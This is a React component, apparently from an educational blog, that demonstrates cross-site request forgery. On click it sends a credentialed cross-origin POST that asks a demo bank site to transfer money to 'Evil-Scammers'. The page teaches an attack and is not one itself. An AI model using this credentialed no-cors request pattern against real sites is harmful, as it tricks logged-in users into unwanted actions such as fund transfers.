// @flow
import classNames from 'classnames/bind';
import React, { useCallback, useState } from 'react';

import styles from './CSRFPostButton.module.scss';

const cx = classNames.bind(styles);

// Props have to be lowercase and are strings b/c this component is used in markdown.
type Props = $ReadOnly<{|
  children: string,
  'post-click-children'?: string,
|}>;

export default function CSRFPostButton(props: Props) {
  const [hasClicked, setHasClicked] = useState(false);

  const onClick = useCallback(() => {
    const body = new URLSearchParams('amount=1000&description=Gotcha!&to=Evil-Scammers');
    fetch('https://dsb.victorzhou.com/transfer', {
      body,
      credentials: 'include', // include cookies, despite being a cross-origin request
      method: 'post',
      mode: 'no-cors',
    })
      .then(() => {
        setHasClicked(true);
      })
      .catch(console.error);
  }, []);

  return (
    <div className={styles['wrapper']}>
      <button className={cx({ button: true, clicked: hasClicked })} onClick={onClick}>
        {hasClicked && props['post-click-children'] ? props['post-click-children'] : props.children}
      </button>
    </div>
  );
}
